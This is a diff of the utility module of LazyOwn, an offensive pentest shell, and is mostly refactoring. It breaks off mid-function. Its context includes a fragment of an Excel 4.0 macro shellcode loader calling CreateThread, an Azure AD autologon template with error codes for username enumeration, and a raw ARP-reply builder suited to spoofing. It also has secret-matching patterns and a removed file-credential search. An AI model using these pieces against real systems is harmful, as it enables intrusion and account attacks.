@@ -4,7 +4,7 @@ utils.py
 Author: Gris Iscomeback
 Email: grisiscomeback[at]gmail[dot]com
 Creation date: 09/06/2024
-License: GPL v3
+License: AGPL v3
 
 Description: This file contains the logic for all functions used in the LazyOwnShell class.
 
@@ -16,74 +16,124 @@ Description: This file contains the logic for all functions used in the LazyOwnS
 ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
 """
 
-import re
-import os
-import io
-import csv
-import sys
-import ssl
-import gzip
-import json
-import time
-import yaml
-import uuid
+import argparse
+import base64
+import binascii
+import bisect
+import csv  # noqa: F401
+import ctypes  # noqa: F401
+import curses  # noqa: F401
 import glob
+import gzip
+import hashlib  # noqa: F401
+import importlib.util
+import io  # noqa: F401
+import itertools  # noqa: F401
+import json
+import logging
+import os
+import random
+import re
+import readline
 import shlex
 import shutil
-import bisect
-import pickle
 import signal
-import base64
-import curses
-import string
-import ctypes
 import socket
+import ssl  # noqa: F401
+import string
 import struct
-import random
-import hashlib
-import argparse
-import binascii
-import readline
-import requests
-import tempfile
-import itertools
-import threading
 import subprocess
+import sys
+import tempfile
+import threading
+import time
 import urllib.parse
 import urllib.request
-import importlib.util
-from os import urandom
-from io import StringIO
-from pathlib import Path
-from rich.text import Text
-from threading import Timer
-from rich.panel import Panel
-from bs4 import BeautifulSoup
-from itertools import product
-from rich.console import Console
+import uuid  # noqa: F401
 import xml.etree.ElementTree as ET
-from html.parser import HTMLParser
-from concurrent.futures import ThreadPoolExecutor
-from modules.lazyencoder_decoder import encode, decode
-from datetime import datetime, timedelta, date, timezone
-from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import quote, unquote, urlparse, urljoin
-from requests.exceptions import ConnectionError, RequestException
+from concurrent.futures import ThreadPoolExecutor  # noqa: F401
+from datetime import date, datetime, timedelta, timezone  # noqa: F401
+from html.parser import HTMLParser  # noqa: F401
+from http.server import BaseHTTPRequestHandler, HTTPServer  # noqa: F401
+from io import StringIO  # noqa: F401
+from itertools import product  # noqa: F401
+from os import urandom  # noqa: F401
+from pathlib import Path  # noqa: F401
+from threading import Timer  # noqa: F401
+from urllib.parse import quote, unquote, urljoin, urlparse  # noqa: F401
 
-from core.config import Config, PAYLOAD_FILENAME, PAYLOAD_PATH, load_payload, save_payload
-from core.console import (
-    BG_BLACK, BG_BLUE, BG_BRIGHT_BLACK, BG_BRIGHT_BLUE, BG_BRIGHT_CYAN,
-    BG_BRIGHT_GREEN, BG_BRIGHT_MAGENTA, BG_BRIGHT_RED, BG_BRIGHT_WHITE,
-    BG_BRIGHT_YELLOW, BG_COLOR_256, BG_CYAN, BG_GREEN, BG_MAGENTA, BG_RED,
-    BG_TRUE_COLOR, BG_WHITE, BG_YELLOW, BLACK, BLINK, BLUE, BOLD,
-    BRIGHT_BLACK, BRIGHT_BLUE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_MAGENTA,
-    BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW, COLOR_256, CYAN, GREEN, INVERT,
-    MAGENTA, RED, RESET, SURROGATE_CHARS, TRANSLATION_TABLE, TRUE_COLOR,
-    UNDERLINE, WHITE, YELLOW, print_error, print_msg, print_succ, print_warn,
+import requests
+import yaml
+from bs4 import BeautifulSoup  # noqa: F401
+from requests.exceptions import ConnectionError, RequestException  # noqa: F401
+from rich.console import Console  # noqa: F401
+from rich.panel import Panel  # noqa: F401
+from rich.text import Text  # noqa: F401
+
+from core.config import PAYLOAD_FILENAME, PAYLOAD_PATH, Config, load_payload, save_payload  # noqa: F401
+from core.console import (  # noqa: F401
+    BG_BLACK,
+    BG_BLUE,
+    BG_BRIGHT_BLACK,
+    BG_BRIGHT_BLUE,
+    BG_BRIGHT_CYAN,
+    BG_BRIGHT_GREEN,
+    BG_BRIGHT_MAGENTA,
+    BG_BRIGHT_RED,
+    BG_BRIGHT_WHITE,
+    BG_BRIGHT_YELLOW,
+    BG_COLOR_256,
+    BG_CYAN,
+    BG_GREEN,
+    BG_MAGENTA,
+    BG_RED,
+    BG_TRUE_COLOR,
+    BG_WHITE,
+    BG_YELLOW,
+    BLACK,
+    BLINK,
+    BLUE,
+    BOLD,
+    BRIGHT_BLACK,
+    BRIGHT_BLUE,
+    BRIGHT_CYAN,
+    BRIGHT_GREEN,
+    BRIGHT_MAGENTA,
+    BRIGHT_RED,
+    BRIGHT_WHITE,
+    BRIGHT_YELLOW,
+    COLOR_256,
+    CYAN,
+    GREEN,
+    INVERT,
+    MAGENTA,
+    RED,
+    RESET,
+    SURROGATE_CHARS,
+    TRANSLATION_TABLE,
+    TRUE_COLOR,
+    UNDERLINE,
+    WHITE,
+    YELLOW,
+    ensure_blocking_stdio,
+    print_error,
+    print_msg,
+    print_succ,
+    print_warn,
+    write_stdout,
 )
-from core.crypto import xor_encrypt_decrypt
-from core.validators import check_lhost, check_lport, check_port, check_rhost
+from core.crypto import AESencrypt, dropFile, generate_xor_key, xor_encrypt_decrypt  # noqa: F401
 from core.dependencies import optional_attr, optional_import
+from core.parsers import strip_ansi  # noqa: F401  # noqa: F401
+from core.process import (  # noqa: F401
+    check_go_tool_installed,
+    check_sudo,
+    handle_multiple_rhosts,
+    is_binary_present,
+    run_command,
+)
+from core.validators import check_lhost, check_lport, check_port, check_rhost  # noqa: F401
+from modules.lazyencoder_decoder import encode  # noqa: F401
 
 # Optional heavy dependencies are bound lazily (see core/dependencies.py) and re-exported to lazyown.py via star import.
 AES = optional_attr("Crypto.Cipher", "AES")
@@ -102,9 +152,7 @@ IPAddress = optional_attr("netaddr", "IPAddress")
 IPRange = optional_attr("netaddr", "IPRange")
 transport = optional_attr("impacket.dcerpc.v5", "transport")
 IObjectExporter = optional_attr("impacket.dcerpc.v5.dcomrt", "IObjectExporter")
-RPC_C_AUTHN_LEVEL_NONE = optional_attr(
-    "impacket.dcerpc.v5.rpcrt", "RPC_C_AUTHN_LEVEL_NONE"
-)
+RPC_C_AUTHN_LEVEL_NONE = optional_attr("impacket.dcerpc.v5.rpcrt", "RPC_C_AUTHN_LEVEL_NONE")
 
 
 query_id = 0
@@ -131,12 +179,28 @@ COMMAND = None
 NOLOGS = False
 RUN_AS_ROOT = False
 USER_ALIASES_FILE = "user_aliases.json"
+HEADLESS = False
 
-os.environ['OPENSSL_CONF'] = '/usr/lib/ssl/openssl.cnf'
+os.environ.setdefault("OPENSSL_CONF", "/etc/ssl/openssl.cnf")
 REQUIRED_KEYS = [
-    "id", "name", "description", "technique_name", "target_os", "binary",
-    "lang", "output_path", "path_src", "target_path", "command", "payload",
-    "clean_cmd", "compile", "droper", "replace_command", "copy_command", "sleep"
+    "id",
+    "name",
+    "description",
+    "technique_name",
+    "target_os",
+    "binary",
+    "lang",
+    "output_path",
+    "path_src",
+    "target_path",
+    "command",
+    "payload",
+    "clean_cmd",
+    "compile",
+    "droper",
+    "replace_command",
+    "copy_command",
+    "sleep",
 ]
 global payload_url, target_domain, concurrency, request_timeout, include_subdomains
 OLD_BANNER = f"""{GREEN}
@@ -199,14 +263,18 @@ C;X1;Y9;ENEXT()
 C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
 C;X1;Y11;EHALT()
 """
-detailed_codes = {'AADSTS50034' : 'The user does not exist',
-'AADSTS50053' : 'The user exists and the correct username and password were entered, but the account is locked',
-'AADSTS50056' : 'The user exists but does not have a password in Azure AD',
-'AADSTS50126' : 'The user exists, but the wrong password was entered',
-'AADSTS80014' : 'The user exists, but the maximum Pass-through Authentication time was exceeded',
-'AADSTS81016' : 'Invalid STS Request (User likely exists)' }
+detailed_codes = {
+    "AADSTS50034": "The user does not exist",
+    "AADSTS50053": "The user exists and the correct username and password were entered, but the account is locked",
+    "AADSTS50056": "The user exists but does not have a password in Azure AD",
+    "AADSTS50126": "The user exists, but the wrong password was entered",
+    "AADSTS80014": "The user exists, but the maximum Pass-through Authentication time was exceeded",
+    "AADSTS81016": "Invalid STS Request (User likely exists)",
+}
 
-url_template = string.Template("""https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$uuid""")
+url_template = string.Template(
+    """https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$uuid"""
+)
 
 xml_body = string.Template("""<?xml version="1.0" encoding="UTF-8"?>
 <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
@@ -240,15 +308,148 @@ xml_body = string.Template("""<?xml version="1.0" encoding="UTF-8"?>
     </trust:RequestSecurityToken>
   </s:Body>
 </s:Envelope>""")
-def check_go_tool_installed(tool_name):
-    try:
-        process = subprocess.run([tool_name, "help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
-        if process.returncode == 0:
+
+
+_SECRET_PATTERNS = (
+    re.compile(r"gsk_[A-Za-z0-9]{10,}"),
+    re.compile(r"sk-[A-Za-z0-9_-]{10,}"),
+    re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}"),
+    re.compile(r"(?i)\b(api[_-]?key|token|password|passwd|secret)(['\"]?\s*[:=]\s*['\"]?)([^\s'\"]{6,})"),
+)
+
+
+_SUDO_STATE: dict = {"checked": False, "ok": False}
+
+
+def lazyown_set_config(key: str, value, config_obj=None):
+    """Persist a key to ``payload.json`` and refresh any live config object.
+
+    This is the sanctioned writer for runtime configuration changes made
+    outside ``do_assign`` / ``do_set`` so every write is audited and atomic.
+
+    Args:
+        key: Payload key to set. Must not be empty.
+        value: Value to store as JSON.
+        config_obj: Optional live config wrapper (``core.config.Config``)
+            or dict-params shell object kept in sync with the write.
+
+    Returns:
+        The value that was stored.
+
+    Raises:
+        ValueError: if ``key`` is empty.
+        OSError: if the payload file cannot be written.
+    """
+    if not key:
+        raise ValueError("lazyown_set_config requires a non-empty key")
+    payload = load_payload()
+    payload[key] = value
+    save_payload(payload)
+    if config_obj is not None:
+        try:
+            setattr(config_obj, key, value)
+            if hasattr(config_obj, "config") and isinstance(config_obj.config, dict):
+                config_obj.config[key] = value
+        except Exception as exc:
+            logging.debug("Could not mirror %s onto the live config: %s", key, exc)
+    return value
+
+
+def needs_sudo(command: str) -> bool:
+    """Return True when any shell segment of the command runs sudo/doas.
+
+    Understands the wrapper forms the alias table uses (``sh sudo ...``)
+    and leading environment assignments, so a command that merely hides
+    sudo behind an alias expansion is still detected.
+
+    Args:
+        command: Shell command line about to run.
+
+    Returns:
+        True when the command would invoke sudo or doas.
+    """
+    for segment in re.split(r"[;&|]+", str(command or "")):
+        tokens = segment.strip().split()
+        while tokens and (
+            tokens[0] in ("sh", "bash", "zsh", "env", "command", "exec", "nohup", "time") or "=" in tokens[0]
+        ):
+            tokens = tokens[1:]
+        if tokens and tokens[0] in ("sudo", "doas"):
             return True
-        else:
-            return False
-    except FileNotFoundError:
+    return False
+
+
+def sudo_available() -> bool:
+    """Return whether sudo can run unattended right now.
+
+    The unattended loop must not launch sudo commands that will die on a
+    missing terminal; one ``sudo -n true`` probe answers that for good.
+    An armed retry session (``SUDO_ASKPASS`` provided by
+    :mod:`modules.retry_session`) answers True while its on-disk askpass
+    pair is sound, and clears the stale probe cache afterwards.
+
+    Returns:
+        True when ``sudo -n true`` succeeds or an elevated retry session
+        is armed.
+    """
+    retry_open = _retry_sudo_gate()
+    if retry_open:
+        return True
+    if _SUDO_STATE["checked"]:
+        return bool(_SUDO_STATE["ok"])
+    ok = False
+    try:
+        proc = subprocess.run(
+            ["sudo", "-n", "true"],
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=5,
+            check=False,
+        )
+        ok = proc.returncode == 0
+    except Exception:
+        ok = False
+    _SUDO_STATE["checked"] = True
+    _SUDO_STATE["ok"] = ok
+    return ok
+
+
+def _retry_sudo_gate() -> bool:
+    """Return True while a session-bound retry sudo askpass is armed.
+
+    Reads only environment markers set by ``modules.retry_session`` and
+    verifies both on-disk files exist, so no stale environment can claim
+    elevation. Import-free by design (``utils`` stays stand-alone).
+    """
+    if os.environ.get("LAZYOWN_RETRY_SUDO") != "1":
         return False
+    helper = os.environ.get("SUDO_ASKPASS", "")
+    if not helper or not os.path.isfile(helper):
+        return False
+    session_dir = os.path.dirname(os.path.abspath(helper))
+    return os.path.isfile(os.path.join(session_dir, "sudo.secret"))
+
+
+def redact_secrets(text):
+    """Mask API keys and credentials embedded in a command line.
+
+    Args:
+        text: Command line or log message that may embed secrets.
+
+    Returns:
+        The text with recognized secret values replaced by ``***`` so
+        neither the operator console nor the event log stores them.
+    """
+    value = str(text or "")
+    if not value:
+        return value
+    redacted = value
+    for pattern in _SECRET_PATTERNS[:3]:
+        redacted = pattern.sub("***", redacted)
+    redacted = _SECRET_PATTERNS[3].sub(lambda m: f"{m.group(1)}{m.group(2)}***", redacted)
+    return redacted
+
 
 def parse_ip_mac(input_string):
     """
@@ -271,10 +472,6 @@ def parse_ip_mac(input_string):
         print_error("Error: Input must be in the format 'IP: (192.168.1.222) MAC: ec:c3:02:b0:4c:96'.")
         return None, None
 
-def strip_ansi(self, text: str) -> str:
-    import re
-    ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
-    return ansi_escape.sub('', text)
 
 def create_arp_packet(src_mac, src_ip, dst_ip, dst_mac):
     """
@@ -292,26 +489,24 @@ def create_arp_packet(src_mac, src_ip, dst_ip, dst_mac):
         bytes: The constructed ARP packet containing the Ethernet and ARP headers.
     """
     eth_header = struct.pack(
-        '!6s6sH',
-        binascii.unhexlify(dst_mac.replace(':', '')),
-        binascii.unhexlify(src_mac.replace(':', '')),
-        0x0806
+        "!6s6sH", binascii.unhexlify(dst_mac.replace(":", "")), binascii.unhexlify(src_mac.replace(":", "")), 0x0806
     )
 
     arp_header = struct.pack(
-        '!HHBBH6s4s6s4s',
+        "!HHBBH6s4s6s4s",
         0x0001,
         0x0800,
         6,
         4,
         0x0002,
-        binascii.unhexlify(src_mac.replace(':', '')),
+        binascii.unhexlify(src_mac.replace(":", "")),
         socket.inet_aton(src_ip),
-        binascii.unhexlify(dst_mac.replace(':', '')),
-        socket.inet_aton(dst_ip)
+        binascii.unhexlify(dst_mac.replace(":", "")),
+        socket.inet_aton(dst_ip),
     )
 
     return eth_header + arp_header
+
 
 def send_packet(packet, iface):
     """
@@ -330,6 +525,7 @@ def send_packet(packet, iface):
         sock.bind((iface, 0))
         sock.send(packet)
 
+
 def load_version():
     """
     Load the version number from the 'version.json' file.
@@ -339,18 +535,41 @@ def load_version():
     If the version key does not exist, it returns a default version 'release/v0.0.14'.
     If the file is not found, it also returns the default version.
 
+    The version.json is the single source of truth, updated by deploy.sh.
+
     Returns:
     - str: The version number from the file or the default version if the file is not found or the version key is missing.
     """
     try:
-        with open('version.json', 'r') as f:
+        with open("version.json", "r") as f:
             data = json.load(f)
-            return data.get('version', 'release/v0.0.14')
+            return data.get("version", "release/0.2.157")
     except FileNotFoundError:
-        return 'release/v0.0.14'
+        return "release/0.2.157"
+
 
 version = load_version()
 url_download = f"https://github.com/grisuno/LazyOwn/archive/refs/tags/{version}.tar.gz"
+
+
+def parse_bool(value):
+    """
+    Interpret a configuration value as a boolean.
+
+    Accepts the canonical truthy strings used across payload.json and
+    form surfaces (``true``, ``1``, ``yes``, ``on``, case-insensitive).
+    Anything else evaluates to False so a missing or typo'd flag can
+    never silently enable a feature.
+
+    Args:
+        value: The raw value; converted to string before inspection.
+
+    Returns:
+        bool: True only for the canonical truthy strings.
+    """
+    return str(value).strip().lower() in ("true", "1", "yes", "on")
+
+
 def signal_handler(sig, frame):
     """
     Handles signals such as Control + C and shows a message on how to exit.
@@ -367,90 +586,13 @@ def signal_handler(sig, frame):
     """
 
     global should_exit
-    print_warn(
-        f"{RED}{YELLOW} To exit, use the command{GREEN} exit, q, or qa ...{RESET}"
-    )
+    print_warn(f"{RED}{YELLOW} To exit, use the command{GREEN} exit, q, or qa ...{RESET}")
     should_exit = True
     readline.set_history_length(0)
     return
 
 
 signal.signal(signal.SIGINT, signal_handler)
-
-
-def is_binary_present(binary_name):
-    """
-    Internal function to verify if a binary is present on the operating system.
-
-    This function checks if a specified binary is available in the system's PATH
-    by using the `which` command. It returns True if the binary is found and False
-    otherwise.
-
-    The lookup is performed with :func:`shutil.which`, which resolves the name
-    against ``PATH`` without spawning a shell. This avoids the command-injection
-    surface of interpolating ``binary_name`` into a shell string and works on
-    platforms that do not ship the ``which`` utility.
-
-    :param binary_name: The name of the binary to be checked.
-    :type binary_name: str
-    :return: True if the binary is present, False otherwise.
-    :rtype: bool
-    """
-    return shutil.which(binary_name) is not None
-
-
-def handle_multiple_rhosts(func):
-    """
-    Internal function to handle multiple remote hosts (rhost) for operations.
-
-    This function is a decorator that allows an operation to be performed across
-    multiple remote hosts specified in `self.params["rhost"]`. It converts a single
-    remote host into a list if necessary, and then iterates over each host,
-    performing the given function with each host. After the operation, it restores
-    the original remote host value.
-
-    :param func: The function to be decorated and executed for each remote host.
-    :type func: function
-    :return: The decorated function.
-    :rtype: function
-    """
-
-    def wrapper(self, *args, **kwargs):
-        """internal wrapper of internal function to implement multiples rhost to operate. """
-        rhosts = self.params["rhost"]
-        if isinstance(rhosts, str):
-            rhosts = [rhosts]
-
-        for rhost in rhosts:
-            if not check_rhost(rhost):
-                continue
-            original_rhost = self.params["rhost"]
-            self.params["rhost"] = rhost
-            func(self, *args, **kwargs)
-            self.params["rhost"] = original_rhost
-
-    return wrapper
-
-
-
-def check_sudo():
-    """
-    Checks if the script is running with superuser (sudo) privileges, and if not,
-    restarts the script with sudo privileges.
-
-    This function verifies if the script is being executed with root privileges
-    by checking the effective user ID. If the script is not running as root,
-    it prints a warning message and restarts the script using sudo.
-
-    :return: None
-    """
-
-    if os.geteuid() != 0:
-        print_warn(
-            "This script requires superuser permissions. Relaunching with sudo..."
-        )
-        args = ["sudo", sys.executable] + sys.argv
-        os.execvpe("sudo", args, os.environ)
 
 
 def activate_virtualenv(venv_path):
@@ -466,7 +608,7 @@ def activate_virtualenv(venv_path):
     """
 
     process = subprocess.Popen(
-        ["bash", "-c", f"source {venv_path}/bin/activate && exec bash"],
+        ["bash", "-c", f"source {shlex.quote(str(venv_path))}/bin/activate && exec bash"],
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
@@ -541,38 +683,6 @@ def get_open_ports():
     return tcp_ports, udp_ports
 
 
-def find_credentials(directory):
-    """
-    Searches for potential credentials in files within the specified directory.
-
-    This function uses a regular expression to find possible credentials such as
-    passwords, secrets, API keys, and tokens in files within the given directory.
-    It iterates through all files in the directory and prints any matches found.
-
-    :param directory: The directory to search for files containing credentials.
-    :type directory: str
-    :return: None
-    """
-    regex = re.compile(
-        r"(password|passwd|secret|api_key|token)[\s:=]*[\w\d]{6,}", re.IGNORECASE
-    )
-
-    for root, dirs, files in os.walk(directory):
-        for file in files:
-            try:
-                with open(os.path.join(root, file), "r") as f:
-                    content = f.read()
-                    matches = regex.findall(content)
-                    if matches:
-                        print_msg(
-                            f"Credenciales encontradas en {os.path.join(root, file)}:"
-                        )
-                        for match in matches:
-                            print_msg(f"{match}")
-            except Exception as e:
-                print_error(f"No se pudo leer el archivo {file}: {e}")
-
-
 def rotate_char(c, shift):
     """
     Internal function to rotate characters for ROT cipher.
@@ -590,9 +700,10 @@ def rotate_char(c, shift):
     """
 
     if c in string.ascii_letters:
-        start = ord('a') if c.islower() else ord('A')
+        start = ord("a") if c.islower() else ord("A")
         return chr((ord(c) - start + shift) % 26 + start)
     return c
+
 
 def get_network_info():
     """
@@ -607,30 +718,37 @@ def get_network_info():
              are their associated IP addresses.
     :rtype: dict
     """
-    command = (
-        'ip a show scope global | '
-        'awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } '
-        '/^[[:space:]]*inet / { split($2, a, "/"); print iface " " a[1] }\''
-    )
-    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    command = ["ip", "a", "show", "scope", "global"]
+    result = subprocess.run(command, capture_output=True, text=True)
     output = result.stdout.strip()
     network_info = {}
+    current_iface = None
 
-    for line in output.split('\n'):
-        parts = line.split(maxsplit=1)
-        if len(parts) == 2:
-            iface, ip = parts
-            network_info[iface] = ip
-        else:
-            print_error(f"Unexpected format in line: '{line}'")
+    for line in output.split("\n"):
+        import re
+
+        iface_match = re.match(r"^[0-9]+:\s+(\S+?):", line)
+        if iface_match:
+            current_iface = iface_match.group(1)
+            continue
+        if current_iface and line.strip().startswith("inet "):
+            parts = line.strip().split()
+            if len(parts) >= 2:
+                addr = parts[1].split("/")[0]
+                network_info[current_iface] = addr
 
     return network_info
 
+
 def get_git_info():
     try:
-        branch = subprocess.check_output(['git', 'rev-parse', '--abbrev-ref', 'HEAD'], stderr=subprocess.DEVNULL).decode('utf-8').strip()
-        modified = subprocess.call(['git', 'diff', '--quiet'], stderr=subprocess.DEVNULL) != 0
-        staged = subprocess.call(['git', 'diff', '--staged', '--quiet'], stderr=subprocess.DEVNULL) != 0
+        branch = (
+            subprocess.check_output(["git", "rev-parse", "--abbrev-ref", "HEAD"], stderr=subprocess.DEVNULL)
+            .decode("utf-8")
+            .strip()
+        )
+        modified = subprocess.call(["git", "diff", "--quiet"], stderr=subprocess.DEVNULL) != 0
+        staged = subprocess.call(["git", "diff", "--staged", "--quiet"], stderr=subprocess.DEVNULL) != 0
         if modified or staged:
             return f" {BRIGHT_RED}✗{RESET} {BRIGHT_YELLOW}{branch}{RESET}"
         else:
@@ -640,11 +758,13 @@ def get_git_info():
     except subprocess.CalledProcessError:
         return ""
 
+
 def get_venv_info():
-    if 'VIRTUAL_ENV' in os.environ:
-        venv_name = os.path.basename(os.environ['VIRTUAL_ENV'])
+    if "VIRTUAL_ENV" in os.environ:
+        venv_name = os.path.basename(os.environ["VIRTUAL_ENV"])
         return f" ({BRIGHT_BLUE}🐍{venv_name}{RESET})"
     return ""
+
 
 def _load_prompt_payload() -> dict:
     """Read ``payload.json`` defensively for the prompt renderer.
@@ -677,6 +797,7 @@ def getprompt():
         return f"{BRIGHT_CYAN}$ {RESET}"
     return render_prompt(_load_prompt_payload())
 
+
 def copy2clip(text):
     """
     Copia el texto proporcionado al portapapeles usando xclip.
@@ -688,7 +809,7 @@ def copy2clip(text):
         copy2clip("Hello, World!")
     """
     try:
-        subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode(), check=True)
+        subprocess.run(["xclip", "-selection", "clipboard"], input=text.encode(), check=True)
         print_msg(f"Text copied to clipboard. {text}")
         return text
     except subprocess.CalledProcessError as e:
@@ -696,16 +817,18 @@ def copy2clip(text):
     except FileNotFoundError:
         print_error("xclip not found `sudo apt-get install xclip`.")
 
+
 def clean_output(output):
     """Removes color escape sequences and other non-printable characters."""
 
-    output = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', output)
-    output = re.sub(r'(\x07|\x08|\x0A|\x0D|\x1B|\x7F|\x9B|\033\\|\033\\|\033\[|\033\]|\033\[[\d;]*[a-zA-Z])', '', output)
-    output = re.sub(r'\\(?:33\[K|10|7)', '', output)
-    output = re.sub(r' +', ' ', output)
-    output = '\n'.join(line.strip() for line in output.split('\n') if line.strip())
+    output = re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", output)
+    output = re.sub(
+        r"(\x07|\x08|\x0A|\x0D|\x1B|\x7F|\x9B|\033\\|\033\\|\033\[|\033\]|\033\[[\d;]*[a-zA-Z])", "", output
+    )
+    output = re.sub(r"\\(?:33\[K|10|7)", "", output)
+    output = re.sub(r" +", " ", output)
+    output = "\n".join(line.strip() for line in output.split("\n") if line.strip())
     return output
-
 
 
 def teclado_usuario(filename):
@@ -720,18 +843,18 @@ def teclado_usuario(filename):
         Exception: Para otros errores que puedan ocurrir.
     """
     try:
-        with open(filename, 'r') as file:
+        with open(filename, "r") as file:
             content = file.readlines()
 
         output = ""
         for line in content:
-            if line.startswith('write(5,'):
+            if line.startswith("write(5,"):
                 match = re.search(r'write\(5, "(.*?)"', line)
                 if match:
                     char = match.group(1)
-                    if char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -.':
+                    if char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -.":
                         output += char
-                    elif char == '\\n':
+                    elif char == "\\n":
                         print(output)
                         output = ""
 
@@ -742,7 +865,6 @@ def teclado_usuario(filename):
         print(f"Archivo {filename} no encontrado.")
     except Exception as e:
         print(f"Error: {e}")
-
 
 
 def salida_strace(filename):
@@ -757,12 +879,12 @@ def salida_strace(filename):
         Exception: Para otros errores que puedan ocurrir.
     """
     try:
-        with open(filename, 'r') as file:
+        with open(filename, "r") as file:
             content = file.readlines()
 
         output = ""
         for line in content:
-            if line.startswith('write(5,'):
+            if line.startswith("write(5,"):
                 match = re.search(r'write\(5, "(.*?)"', line)
                 if match:
                     text = match.group(1)
@@ -800,29 +922,25 @@ def exploitalert(content):
     """
     try:
         if len(content) != 0:
-
             print_msg(f"|{GREEN}+ ExploitAlert Result {WHITE}")
             print_msg("|------------------------")
-
 
             predata = []
             for data in content:
                 print_msg(f"|{BLUE}-{WHITE} Title : {data['name']}")
                 print_msg(f"|{BLUE}-{WHITE} Link : https://www.exploitalert.com/view-details.html?id={data['id']}")
 
-
-
-                predata.append({
-                    "title" : data['name'],
-                    "link" : f"https://www.exploitalert.com/view-details.html?id={data['id']}"
-                })
+                predata.append(
+                    {"title": data["name"], "link": f"https://www.exploitalert.com/view-details.html?id={data['id']}"}
+                )
             print_msg(f"|{BLUE}-{WHITE} Total Result : {GREEN}{len(content)}{WHITE} Exploits Found!")
-            data.append({"exploitalert" : predata})
+            data.append({"exploitalert": predata})
         else:
             print_error(f"|{RED}- No result in ExploitAlert!{WHITE}")
-    except:
+    except Exception:
         print_error(f"|{RED}- Internal Error - No result in ExploitAlert!{WHITE}")
     return
+
 
 def packetstormsecurity(content):
     """
@@ -844,7 +962,6 @@ def packetstormsecurity(content):
     try:
         reg = re.findall('<dt><a class="ico text-plain" href="(.*?)" title="(.*?)">(.*?)</a></dt>', content)
         if len(reg) != 0:
-
             print_msg(f"|{GREEN}+ PacketStorm Result {WHITE}")
             print_msg("|-----------------------")
 
@@ -853,18 +970,15 @@ def packetstormsecurity(content):
                 print_msg(f"|{BLUE}-{WHITE} Title : {data[2]}")
                 print_msg(f"|{BLUE}-{WHITE} Link : https://packetstormsecurity.com{data[0]}")
 
-
-                predata.append({
-                    "title" : data[2],
-                    "link" : f"https://packetstormsecurity.com{data[0]}"
-                })
+                predata.append({"title": data[2], "link": f"https://packetstormsecurity.com{data[0]}"})
             print_msg(f"|{BLUE}-{WHITE} Total Result : {GREEN}{len(reg)}{WHITE} Exploits Found!")
-            data.append({"packetstormsecurity" : predata})
+            data.append({"packetstormsecurity": predata})
         else:
             print_error(f"|{RED}- No result in PacketStorm!{WHITE}")
-    except:
+    except Exception:
         print_error(f"|{RED}- Internal Error - No result in PacketStorm!{WHITE}")
     return
+
 
 def nvddb(content):
     """
@@ -884,32 +998,35 @@ def nvddb(content):
     An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
     """
     try:
-        if len(content['vulnerabilities']) != 0:
+        if len(content["vulnerabilities"]) != 0:
             print_msg(f"{GREEN}|-----------------------------------------------")
             print_msg(f"{GREEN}|+ National Vulnearbility Database Result       +{WHITE}")
             print_msg(f"{GREEN}|-----------------------------------------------")
 
             predata = []
-            for data in content['vulnerabilities']:
+            for data in content["vulnerabilities"]:
                 print_msg(f"{BLUE}-{BG_YELLOW}{RED} ID : {data['cve']['id']}")
                 print_msg(f"{BLUE}-{BG_BLACK}{WHITE} Description : {data['cve']['descriptions'][0]['value']}")
                 print_msg(f"{BLUE}-{BG_BLACK}{BLUE} Link : https://nvd.nist.gov/vuln/detail/{data['cve']['id']}")
 
-                predata.append({
-                    "title" : data['cve']['id'],
-                    "description" : data['cve']['descriptions'][0]['value'],
-                    "link" : f"https://nvd.nist.gov/vuln/detail/{data['cve']['id']}"
-                })
+                predata.append(
+                    {
+                        "title": data["cve"]["id"],
+                        "description": data["cve"]["descriptions"][0]["value"],
+                        "link": f"https://nvd.nist.gov/vuln/detail/{data['cve']['id']}",
+                    }
+                )
             print_msg(f"|{BLUE}-{RED} Total Result : {GREEN}{len(content)}{YELLOW} CVEs Found!")
-            data.append({"nvddb" : predata})
+            data.append({"nvddb": predata})
         else:
             print_error("|")
             print_error(f"|{RED}- No result in National Vulnearbility Database!{WHITE}")
-    except:
+    except Exception:
         print_error(f"|{RED}- Internal Error - No result in National Vulnearbility Database!{WHITE}")
     return
 
-def find_ss(keyword = ""):
+
+def find_ss(keyword=""):
     """
     Find CVEs in the National Vulnerability Database based on a keyword.
 
@@ -927,12 +1044,49 @@ def find_ss(keyword = ""):
     An excellent tool for CVE detection, I implemented only the keyword search as I had to change some libraries. Soon also for XML generated by nmap :) Total thanks to justakazh. https://github.com/justakazh/sicat/
     """
     keyword = f"{keyword}"
-    keyword = keyword.replace(" ", "%20")
-    resp = requests.get(f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}")
-    if resp.status_code == 200:
-        return resp.json()
-    else:
+    keyword_encoded = keyword.replace(" ", "%20")
+    import shutil as _shutil
+    import subprocess as _sp
+
+    curl = _shutil.which("curl")
+    if curl:
+        try:
+            result = _sp.run(
+                [
+                    curl,
